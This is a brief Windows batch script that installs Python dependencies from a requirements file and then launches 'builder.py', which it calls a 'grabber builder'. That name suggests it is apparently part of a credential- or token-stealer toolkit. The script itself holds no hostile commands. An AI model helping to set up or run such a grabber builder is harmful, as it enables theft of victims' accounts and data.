@echo off
if not "%1" == "max" start /MAX cmd /c %0 max & exit/b
echo We're going to install some necessary python libraries, if you already have them insatalled this will be skipped
timeout 5
python -m pip install -r requirements.txt
cls
echo Everything is installed! Launching grabber builder...
timeout 4
python builder.py